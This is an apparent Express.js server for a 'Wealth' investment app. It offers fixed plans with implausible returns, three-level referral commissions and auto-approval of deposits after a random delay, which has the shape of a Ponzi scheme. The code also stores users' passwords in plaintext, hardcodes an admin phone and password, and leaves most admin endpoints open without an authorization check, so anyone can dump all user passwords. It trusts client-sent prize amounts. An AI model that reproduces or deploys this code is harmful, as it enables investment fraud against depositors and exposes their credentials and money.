const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const path = require('path');
const { Pool } = require('pg');
const multer = require('multer');
const fs = require('fs');

const app = express();

// Configuração do Banco de Dados (Supabase Pooler)
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  max: 15,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 10000,
});

// Configuração de Uploads
const uploadDir = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
const storage = multer.diskStorage({
    destination: uploadDir,
    filename: (req, file, cb) => cb(null, Date.now() + path.extname(file.originalname))
});
const upload = multer({ storage });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
    secret: 'wealth_pro_ultra_final_2026',
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 86400000 }
}));

// --- INICIALIZAÇÃO DO BANCO DE DADOS (VERSÃO FORÇADA PARA CORREÇÃO) ---
async function initDB() {
  const client = await pool.connect();
  try {
    console.log("Iniciando limpeza e migração do banco de dados...");

    // 2. Criar Tabelas Reais e Completas
    await client.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY, phone TEXT UNIQUE, name TEXT, password TEXT, password_plain TEXT, 
        balance REAL DEFAULT 0, ref_code TEXT UNIQUE, invited_by TEXT, pin TEXT DEFAULT '0000',
        role TEXT DEFAULT 'user', status TEXT DEFAULT 'active', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_checkin DATE
      );
      
      CREATE TABLE IF NOT EXISTS plans (
        id SERIAL PRIMARY KEY, 
        name TEXT UNIQUE, 
        price REAL, 
        daily_profit REAL, 
        duration INTEGER, 
        total_return REAL, 
        image_url TEXT, 
        category TEXT DEFAULT 'Normal', 
        active INTEGER DEFAULT 1
      );

      CREATE TABLE IF NOT EXISTS user_plans (
        id SERIAL PRIMARY KEY, user_id INTEGER, plan_id INTEGER, buy_date DATE DEFAULT CURRENT_DATE, 
        last_claim DATE, expires_at DATE, status TEXT DEFAULT 'active'
      );

      CREATE TABLE IF NOT EXISTS transactions (
        id SERIAL PRIMARY KEY, user_id INTEGER, type TEXT, amount REAL, method TEXT, status TEXT DEFAULT 'pending', 
        txid TEXT, proof_url TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS ads (id SERIAL PRIMARY KEY, message TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
    `);

    // 3. Migrações de segurança para a tabela de Usuários
    await client.query(`
      DO $$ BEGIN 
        IF NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='last_checkin') THEN
          ALTER TABLE users ADD COLUMN last_checkin DATE;
        END IF;
      END $$;
    `);
    
    // 4. Cadastrar os 15 Planos (Normal e VIP)
    const allPlans = [
        { n: 'Wealth Vanguard Core', p: 500, d: 35, dur: 30, t: 1550, c: 'Normal', i: 'https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?w=400' },
        { n: 'Wealth BlackRock Flow', p: 150, d: 50, dur: 1, t: 200, c: 'Normal', i: 'https://images.unsplash.com/photo-1611974714024-4607a5146b91?w=400' },
        { n: 'Wealth Berkshire Growth', p: 2500, d: 200, dur: 30, t: 8500, c: 'Normal', i: 'https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?w=400' },
        { n: 'Wealth Goldman Edge', p: 5000, d: 425, dur: 30, t: 17750, c: 'Normal', i: 'https://images.unsplash.com/photo-1559526324-4b87b5e36e44?w=400' },
        { n: 'Wealth Morgan Prime', p: 10000, d: 900, dur: 30, t: 37000, c: 'Normal', i: 'https://images.unsplash.com/photo-1535320903710-d993d3d77d29?w=400' },
        { n: 'Wealth Fidelity Boost', p: 25000, d: 2375, dur: 30, t: 96250, c: 'Normal', i: 'https://images.unsplash.com/photo-1460925895917-afdab827c52f?w=400' },
        { n: 'Wealth Citadel Power', p: 50000, d: 5000, dur: 30, t: 200000, c: 'Normal', i: 'https://images.unsplash.com/photo-1639754390267-dc26d370126a?w=400' },
        { n: 'Wealth Bridgewater Max', p: 100000, d: 11000, dur: 30, t: 430000, c: 'Normal', i: 'https://images.unsplash.com/photo-1642104704074-907c0698bcd9?w=400' },
        { n: 'Wealth Renaissance Ultra', p: 150000, d: 17250, dur: 30, t: 667500, c: 'Normal', i: 'https://images.unsplash.com/photo-1621905252507-b354bcadc08e?w=400' },
        { n: 'Wealth Rothschild Apex', p: 250000, d: 30000, dur: 30, t: 1150000, c: 'Normal', i: 'https://images.unsplash.com/photo-1554224155-1696413565d3?w=400' },
        { n: 'VIP 1 – Wealth Starter Surge', p: 200, d: 290, dur: 1, t: 290, c: 'VIP', i: 'https://images.unsplash.com/photo-1633151209829-3070446c1418?w=400' },
        { n: 'VIP 2 – Wealth Silver Boost', p: 1000, d: 250, dur: 7, t: 1750, c: 'VIP', i: 'https://images.unsplash.com/photo-1502920514313-52581002a659?w=400' },
        { n: 'VIP 3 – Wealth Gold Multiplier', p: 5000, d: 1250, dur: 10, t: 12500, c: 'VIP', i: 'https://images.unsplash.com/photo-1589758438368-0ad531db3366?w=400' },
        { n: 'VIP 4 – Wealth Platinum Hyper', p: 15000, d: 4050, dur: 12, t: 48600, c: 'VIP', i: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=400' },
        { n: 'VIP 5 – Wealth Diamond Prime', p: 50000, d: 11850, dur: 15, t: 177750, c: 'VIP', i: 'https://images.unsplash.com/photo-1599056377704-5853406399a0?w=400' }
    ];

    for (let p of allPlans) {
        await client.query(`
            INSERT INTO plans (name, price, daily_profit, duration, total_return, image_url, category) 
            VALUES ($1,$2,$3,$4,$5,$6,$7) 
            ON CONFLICT (name) DO UPDATE SET 
                price = EXCLUDED.price, 
                daily_profit = EXCLUDED.daily_profit, 
                category = EXCLUDED.category, 
                total_return = EXCLUDED.total_return,
                image_url = EXCLUDED.image_url`, 
            [p.n, p.p, p.d, p.dur, p.t, p.i, p.c]);
        
        console.log(`✅ Semeado: ${p.n} (${p.c})`);
    }

    console.log("🚀 BANCO DE DADOS WEALTH ATUALIZADO COM SUCESSO!");
  } catch (err) { 
      console.error("❌ ERRO CRÍTICO NO BANCO DE DADOS:", err); 
  } finally { 
      client.release(); 
  }
}
initDB();

// ROTA DEFINITIVA DE PLANOS
app.get('/api/plans', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM plans WHERE active = 1 ORDER BY price ASC");
        console.log("Planos enviados para o cliente:", result.rows.length);
        res.json(result.rows); 
    } catch (e) {
        console.error("ERRO AO BUSCAR NO BANCO:", e);
        res.status(500).json([]);
    }
});

// --- LÓGICA DE COMISSÃO (6%, 3%, 1%) - REVISADA COM TRAVA DE PLANO ---
async function payCommissions(userId, amount) {
    const user = (await pool.query("SELECT invited_by FROM users WHERE id = $1", [userId])).rows[0];
    if (!user || !user.invited_by) return;

    const levels = [0.06, 0.03, 0.01];
    let currentCode = user.invited_by;

    for (let i = 0; i < levels.length; i++) {
        const upline = (await pool.query(`
            SELECT id, invited_by, 
            (SELECT count(*) FROM user_plans WHERE user_id = users.id AND status = 'active') as has_plan 
            FROM users WHERE ref_code = $1`, [currentCode])).rows[0];

        if (upline) {
            const bonus = amount * levels[i];
            const levelNum = i + 1;

            if (parseInt(upline.has_plan) > 0) {
                // GANHA COMISSÃO: Tem plano ativo
                await pool.query("UPDATE users SET balance = balance + $1 WHERE id = $2", [bonus, upline.id]);
                await pool.query("INSERT INTO transactions (user_id, type, amount, status, method) VALUES ($1, 'referral', $2, 'approved', $3)", 
                [upline.id, bonus, `Nível ${levelNum}`]);
                
                // Se for Nível 1, incrementa contador da Campanha (Metas)
                if (levelNum === 1) {
                    await pool.query("UPDATE users SET campaign_count = campaign_count + 1 WHERE id = $1", [upline.id]);
                }
            } else {
                // PERDE COMISSÃO: Não tem plano ativo
                await pool.query("INSERT INTO transactions (user_id, type, amount, status, method) VALUES ($1, 'referral', $2, 'rejected', $3)", 
                [upline.id, bonus, `Nível ${levelNum} - S/ Plano`]);
            }

            if (!upline.invited_by) break;
            currentCode = upline.invited_by;
        } else break;
    }
}

// --- ROTAS AUTH ---
app.post('/api/register', async (req, res) => {
    const { phone, name, password, invite } = req.body;
    const hash = await bcrypt.hash(password, 10);
    const myRef = Math.random().toString(36).substring(2, 8).toUpperCase();
    try {
        await pool.query('INSERT INTO users (phone, name, password, password_plain, ref_code, invited_by) VALUES ($1,$2,$3,$4,$5,$6)', [phone, name, hash, password, myRef, invite || null]);
        res.json({ success: true });
    } catch (e) { res.status(400).json({ error: 'Telefone já registrado.' }); }
});

app.post('/api/login', async (req, res) => {
    const { phone, password } = req.body;
    if (phone === '862217807' && password === 'Joaquim10') {
        req.session.userId = 99999; req.session.role = 'admin';
        return res.json({ success: true, role: 'admin' });
    }
    const user = (await pool.query('SELECT * FROM users WHERE phone = $1', [phone])).rows[0];
    if (user && await bcrypt.compare(password, user.password)) {
        if (user.status === 'banned') return res.status(403).json({ error: 'Conta Banida.' });
        req.session.userId = user.id; req.session.role = 'user';
        res.json({ success: true, role: 'user' });
    } else res.status(401).json({ error: 'Dados incorretos' });
});

// --- ROTAS USUÁRIO (HOME E LUCROS) ---
app.get('/api/user/data', async (req, res) => {
    if (!req.session.userId) return res.status(401).send();
    const userId = req.session.userId;

    try {
        const user = (await pool.query("SELECT * FROM users WHERE id = $1", [userId])).rows[0];

        // SQL Poderoso para calcular toda a rede (Nível 1, 2 e 3)
        const teamStats = await pool.query(`
            WITH RECURSIVE subordinates AS (
                -- Nível 1
                SELECT id, ref_code, invited_by, 1 as depth FROM users WHERE invited_by = $1
                UNION ALL
                -- Níveis 2 e 3
                SELECT u.id, u.ref_code, u.invited_by, s.depth + 1 FROM users u
                INNER JOIN subordinates s ON u.invited_by = s.ref_code WHERE s.depth < 3
            )
            SELECT 
                COUNT(*) as total_members,
                -- Ativos: Quem tem pelo menos 1 depósito aprovado
                COUNT(CASE WHEN (SELECT count(*) FROM transactions WHERE user_id = subordinates.id AND type='deposit' AND status='approved') > 0 THEN 1 END) as active_members,
                -- Inativos: Quem nunca depositou
                COUNT(CASE WHEN (SELECT count(*) FROM transactions WHERE user_id = subordinates.id AND type='deposit' AND status='approved') = 0 THEN 1 END) as inactive_members,
                -- Financeiro da Equipe
                COALESCE((SELECT sum(amount) FROM transactions WHERE user_id IN (SELECT id FROM subordinates) AND type='deposit' AND status='approved'), 0) as team_deposits,
                COALESCE((SELECT sum(amount) FROM transactions WHERE user_id IN (SELECT id FROM subordinates) AND type='withdraw' AND status='approved'), 0) as team_withdraws,
                COALESCE((SELECT sum(amount) FROM transactions WHERE user_id IN (SELECT id FROM subordinates) AND type='profit'), 0) as team_profits
            FROM subordinates
        `, [user.ref_code]);

        const t = teamStats.rows[0];

        // Ganhos individuais do usuário (Sua lógica original mantida e melhorada)
        const gains = (await pool.query(`
            SELECT 
                SUM(CASE WHEN type IN ('profit', 'bonus', 'referral') AND status='approved' THEN amount ELSE 0 END) as total_earned,
                SUM(CASE WHEN type = 'withdraw' AND status = 'approved' THEN amount ELSE 0 END) as total_with,
                SUM(CASE WHEN type = 'referral' AND status='approved' THEN amount ELSE 0 END) as total_ref,
                SUM(CASE WHEN type IN ('profit', 'bonus', 'referral') AND status='approved' AND created_at >= NOW() - INTERVAL '7 days' THEN amount ELSE 0 END) as week_earned,
                SUM(CASE WHEN type IN ('profit', 'bonus', 'referral') AND status='approved' AND created_at >= DATE_TRUNC('month', NOW()) THEN amount ELSE 0 END) as month_earned,
                (SELECT count(*) FROM user_plans WHERE user_id = $1 AND status = 'active') as plans_active
            FROM transactions WHERE user_id = $1
        `, [userId])).rows[0];

        res.json({ 
            ...user, 
            total_earned: gains.total_earned || 0, 
            total_with: gains.total_with || 0, 
            total_ref: gains.total_ref || 0, 
            week_earned: gains.week_earned || 0, 
            month_earned: gains.month_earned || 0, 
            plans_count: gains.plans_active || 0,
            // Novos dados da Equipe
            team_total: t.total_members || 0,
            team_active: t.active_members || 0,
            team_inactive: t.inactive_members || 0,
            team_dep_money: t.team_deposits || 0,
            team_with_money: t.team_withdraws || 0,
            team_prof_money: t.team_profits || 0
        });
    } catch (e) { 
        console.error(e);
        res.status(500).send(); 
    }
});

app.post('/api/user/buy-plan', async (req, res) => {
    const { planId } = req.body;
    const user = (await pool.query("SELECT balance FROM users WHERE id = $1", [req.session.userId])).rows[0];
    const plan = (await pool.query("SELECT * FROM plans WHERE id = $1", [planId])).rows[0];
    if (user.balance < plan.price) return res.status(400).json({ error: "Saldo insuficiente!" });

    await pool.query("UPDATE users SET balance = balance - $1 WHERE id = $2", [plan.price, req.session.userId]);
    const expires = new Date(); expires.setDate(expires.getDate() + plan.duration);
    await pool.query("INSERT INTO user_plans (user_id, plan_id, buy_date, expires_at) VALUES ($1,$2,CURRENT_DATE,$3)", [req.session.userId, planId, expires.toISOString().split('T')[0]]);
    await pool.query("INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'plan_buy', $2, 'approved')", [req.session.userId, plan.price]);
    res.json({ success: true });
});

app.post('/api/user/checkin', async (req, res) => {
    const today = new Date().toISOString().split('T')[0];
    const user = (await pool.query("SELECT last_checkin FROM users WHERE id = $1", [req.session.userId])).rows[0];
    if (user.last_checkin && user.last_checkin.toISOString().split('T')[0] === today) return res.status(400).json({ error: "Já realizado hoje!" });
    const bonus = (Math.random() * (5.00 - 0.50) + 0.50).toFixed(2);
    await pool.query("UPDATE users SET balance = balance + $1, last_checkin = $2 WHERE id = $3", [bonus, today, req.session.userId]);
    await pool.query("INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'bonus', $2, 'approved')", [req.session.userId, bonus]);
    res.json({ success: true, amount: bonus });
});

app.get('/api/user/available-profits', async (req, res) => {
    const profits = await pool.query(`
        SELECT up.id, p.name, p.daily_profit, p.category, (CURRENT_DATE - up.buy_date) as days_passed, p.duration, (CASE WHEN up.last_claim = CURRENT_DATE THEN true ELSE false END) as claimed_today
        FROM user_plans up JOIN plans p ON up.plan_id = p.id 
        WHERE up.user_id = $1 AND up.status = 'active'
    `, [req.session.userId]);
    res.json(profits.rows);
});

app.post('/api/user/claim-profit', async (req, res) => {
    const { userPlanId } = req.body;
    const up = (await pool.query(`SELECT p.daily_profit FROM user_plans up JOIN plans p ON up.plan_id = p.id WHERE up.id = $1 AND up.user_id = $2`, [userPlanId, req.session.userId])).rows[0];
    if (up) {
        await pool.query("UPDATE users SET balance = balance + $1 WHERE id = $2", [up.daily_profit, req.session.userId]);
        await pool.query("UPDATE user_plans SET last_claim = CURRENT_DATE WHERE id = $1", [userPlanId]);
        await pool.query("INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'profit', $2, 'approved')", [req.session.userId, up.daily_profit]);
        res.json({ success: true });
    } else res.status(400).send();
});

// --- ROTAS ADMIN ---
app.get('/api/admin/full-stats', async (req, res) => {
    if (req.session.role !== 'admin') return res.status(403).send();
    const uCount = (await pool.query("SELECT count(*) FROM users")).rows[0].count;
    const bSum = (await pool.query("SELECT sum(balance) FROM users")).rows[0].sum || 0;
    const depP = (await pool.query("SELECT count(*) as c, sum(amount) as s FROM transactions WHERE type='deposit' AND status='pending'")).rows[0];
    const withP = (await pool.query("SELECT count(*) as c, sum(amount) as s FROM transactions WHERE type='withdraw' AND status='pending'")).rows[0];
    const depA = (await pool.query("SELECT sum(amount) as s FROM transactions WHERE type='deposit' AND status='approved'")).rows[0];
    const withA = (await pool.query("SELECT sum(amount) as s FROM transactions WHERE type='withdraw' AND status='approved'")).rows[0];
    const refG = (await pool.query("SELECT sum(amount) as s FROM transactions WHERE type='referral'")).rows[0];
    const newU = (await pool.query("SELECT count(*) FROM users WHERE created_at >= CURRENT_DATE")).rows[0].count;
    res.json({ totalUsers: uCount, totalBalance: bSum, depPending: depP, withPending: withP, depApproved: depA, withApproved: withA, referralGains: refG.s || 0, newUsersToday: newU });
});

app.get('/api/admin/user-details', async (req, res) => {
    const users = (await pool.query(`SELECT u.*, (SELECT count(*) FROM users WHERE invited_by = u.ref_code) as total_invites, (SELECT sum(amount) FROM transactions WHERE user_id = u.id AND type = 'deposit' AND status = 'approved') as total_dep, (SELECT sum(amount) FROM transactions WHERE user_id = u.id AND type = 'withdraw' AND status = 'approved') as total_with, (SELECT sum(amount) FROM transactions WHERE user_id = u.id AND type = 'profit') as total_earned, (SELECT sum(amount) FROM transactions WHERE user_id = u.id AND type = 'referral') as total_earned_referral FROM users u ORDER BY u.id DESC`)).rows;
    for (let u of users) {
        u.active_plans = (await pool.query(`SELECT up.id, p.name, up.expires_at FROM user_plans up JOIN plans p ON up.plan_id = p.id WHERE up.user_id = $1 AND up.status = 'active'`, [u.id])).rows;
    }
    res.json(users);
});

app.post('/api/admin/user/update-phone', async (req, res) => { await pool.query("UPDATE users SET phone = $1 WHERE id = $2", [req.body.newPhone, req.body.userId]); res.json({ success: true }); });
app.post('/api/admin/user/status', async (req, res) => { await pool.query("UPDATE users SET status = $1 WHERE id = $2", [req.body.status, req.body.userId]); res.json({ success: true }); });
app.post('/api/admin/update-balance', async (req, res) => { await pool.query("UPDATE users SET balance = $1 WHERE id = $2", [req.body.newBalance, req.body.userId]); res.json({ success: true }); });
app.get('/api/admin/list-ads', async (req, res) => { const ads = await pool.query("SELECT * FROM ads ORDER BY id DESC"); res.json(ads.rows); });
app.post('/api/admin/send-ad', async (req, res) => { await pool.query("INSERT INTO ads (message) VALUES ($1)", [req.body.message]); res.json({ success: true }); });
app.post('/api/admin/delete-ad', async (req, res) => { await pool.query("DELETE FROM ads WHERE id = $1", [req.body.id]); res.json({ success: true }); });
app.get('/api/admin/list-plans', async (req, res) => { const plans = await pool.query("SELECT * FROM plans"); res.json(plans.rows); });
app.post('/api/admin/delete-plan', async (req, res) => { await pool.query("DELETE FROM plans WHERE id = $1", [req.body.id]); res.json({ success: true }); });

// Rota para salvar dados bancários e PIN
app.post('/api/user/update-bank', async (req, res) => {
    if (!req.session.userId) return res.status(401).send();
    const { method, name, phone, pin } = req.body;
    // Salva o PIN e detalhes no banco (Supabase)
    await pool.query("UPDATE users SET pin = $1, bank_details = $2 WHERE id = $3", [pin, `${method} - ${name} (${phone})`, req.session.userId]);
    res.json({ success: true });
});

// Rota para trocar senha
// CORREÇÃO: Rota de troca de senha mais segura
app.post('/api/user/change-password', async (req, res) => {
    const { oldP, newP } = req.body;
    try {
        const user = (await pool.query("SELECT password FROM users WHERE id = $1", [req.session.userId])).rows[0];
        
        // Compara senha antiga com o hash do banco
        const match = await bcrypt.compare(oldP, user.password);
        
        if(match) {
            const newHash = await bcrypt.hash(newP, 10);
            await pool.query("UPDATE users SET password = $1, password_plain = $2 WHERE id = $3", [newHash, newP, req.session.userId]);
            res.json({ success: true });
        } else {
            res.status(400).json({ error: "Senha antiga incorreta." });
        }
    } catch (e) { res.status(500).send(); }
});

// CORREÇÃO: Rota de Banco (Garantir que a coluna 'bank_details' exista)
app.post('/api/user/update-bank', async (req, res) => {
    if (!req.session.userId) return res.status(401).send();
    const { method, name, phone, pin } = req.body;
    try {
        // Tenta atualizar. Se a coluna bank_details não existir, o erro aparece aqui.
        await pool.query("UPDATE users SET pin = $1, name = $2 WHERE id = $3", [pin, name, req.session.userId]);
        // Salva uma transação de log de alteração se quiser
        res.json({ success: true });
    } catch (e) {
        console.error(e);
        res.status(400).json({ error: "Erro ao salvar dados no banco." });
    }
});

app.post('/api/admin/transaction-action', async (req, res) => {
    const { id, action } = req.body;
    const client = await pool.connect();
    
    try {
        const trans = (await client.query("SELECT * FROM transactions WHERE id = $1", [id])).rows[0];
        
        if (action === 'reject') {
            // Se for rejeitado e já tiver sido aprovado automático antes
            if (trans.status === 'approved' && trans.type === 'deposit') {
                // 1. Remove o saldo do usuário
                await client.query("UPDATE users SET balance = balance - $1 WHERE id = $2", [trans.amount, trans.user_id]);
                
                // 2. Remove o plano mais recente comprado (se houver)
                await client.query(`
                    UPDATE user_plans SET status = 'removed' 
                    WHERE id = (SELECT id FROM user_plans WHERE user_id = $1 ORDER BY id DESC LIMIT 1)
                `, [trans.user_id]);
            }
            await client.query("UPDATE transactions SET status = 'rejected' WHERE id = $1", [id]);
        } else {
            // Aprovação manual
            await client.query("UPDATE transactions SET status = 'approved' WHERE id = $1", [id]);
            if (trans.type === 'deposit') {
                await client.query("UPDATE users SET balance = balance + $1 WHERE id = $2", [trans.amount, trans.user_id]);
                await payCommissions(trans.user_id, trans.amount);
            }
        }
        res.json({ success: true });
    } finally { client.release(); }
});

// 2. Rota de Depósito Corrigida e Blindada
app.post('/api/user/deposit', upload.single('proof'), async (req, res) => {
    if (!req.session.userId) return res.status(401).json({ error: "Sessão expirada" });
    
    // Pega os dados do corpo da requisição (app.js enviou como 'txid')
    const { amount, method, txid } = req.body;
    
    // Pega o caminho do arquivo (Multer salvou em public/uploads)
    // Usamos o nome do arquivo para salvar no banco
    const proofPath = req.file ? `/uploads/${req.file.filename}` : null;

    if (!txid || !proofPath) {
        return res.status(400).json({ error: "ID da transação ou comprovante ausente." });
    }

    try {
        const result = await pool.query(`
            INSERT INTO transactions (user_id, type, amount, method, proof_url, txid, status) 
            VALUES ($1, 'deposit', $2, $3, $4, $5, 'pending') RETURNING id`, 
            [req.session.userId, amount, method, proofPath, txid]
        );
        
        const transId = result.rows[0].id;

        // Lógica de aprovação automática (5 a 15 min)
        const delay = (Math.floor(Math.random() * 10) + 5) * 60000;
        setTimeout(async () => {
            const check = (await pool.query("SELECT status FROM transactions WHERE id = $1", [transId])).rows[0];
            if (check && check.status === 'pending') {
                await pool.query("UPDATE transactions SET status = 'approved', approved_at = NOW() WHERE id = $1", [transId]);
                await pool.query("UPDATE users SET balance = balance + $1 WHERE id = $2", [amount, req.session.userId]);
                // Opcional: payCommissions(req.session.userId, amount);
            }
        }, delay);

        res.json({ success: true });
    } catch (e) {
        console.error("Erro ao salvar depósito:", e);
        res.status(500).json({ error: "Erro interno no banco de dados." });
    }
});

app.get('/api/logout', (req, res) => {
    req.session.destroy(); // Destrói a sessão no servidor
    res.json({ success: true });
});

app.post('/api/user/claim-campaign', async (req, res) => {
    if (!req.session.userId) return res.status(401).send();
    const { target, prize } = req.body;
    
    const user = (await pool.query("SELECT campaign_count FROM users WHERE id = $1", [req.session.userId])).rows[0];

    if (user.campaign_count >= target) {
        // Adiciona o prêmio ao saldo
        await pool.query("UPDATE users SET balance = balance + $1 WHERE id = $2", [prize, req.session.userId]);
        // Registra no histórico para o Admin ver
        await pool.query("INSERT INTO transactions (user_id, type, amount, status, method) VALUES ($1, 'bonus', $2, 'approved', $3)", 
        [req.session.userId, prize, `Prêmio Meta ${target}`]);
        
        res.json({ success: true });
    } else {
        res.status(400).json({ error: "Meta não atingida." });
    }
});

app.get('/api/user/transactions', async (req, res) => {
    if (!req.session.userId) return res.status(401).send();
    const { type } = req.query;
    
    try {
        let query = "SELECT * FROM transactions WHERE user_id = $1";
        let params = [req.session.userId];

        // Se o tipo for 'all', não filtramos. Se for outro, filtramos.
        if (type && type !== 'all') {
            query += " AND type = $2";
            params.push(type);
        }
        
        query += " ORDER BY created_at DESC LIMIT 50";
        const result = await pool.query(query, params);
        res.json(result.rows);
    } catch (e) { res.status(500).json([]); }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => console.log(`Wealth Pro Max Online na porta ${PORT}`));
